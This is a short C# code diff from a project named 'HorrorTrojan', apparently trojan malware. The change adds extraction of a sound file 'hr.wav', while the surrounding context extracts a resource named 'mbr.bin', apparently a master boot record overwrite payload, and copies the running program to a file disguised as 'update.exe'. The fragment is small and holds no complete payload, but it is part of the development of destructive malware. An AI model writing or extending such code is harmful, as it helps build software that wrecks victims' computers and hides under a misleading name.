@@ -21,6 +21,7 @@ namespace HorrorTrojan
             ExtractResource("eye.ani", Path.Combine(TargetDir, "eye.ani"));
             ExtractResource("horror.png", Path.Combine(TargetDir, "horror.png"));
             ExtractResource("mbr.bin", Path.Combine(TargetDir, "mbr.bin"));
+            ExtractResource("hr.wav", Path.Combine(TargetDir, "hr.wav"));
             
             string selfPath = Assembly.GetExecutingAssembly().Location;
             string updatePath = Path.Combine(TargetDir, "update.exe");
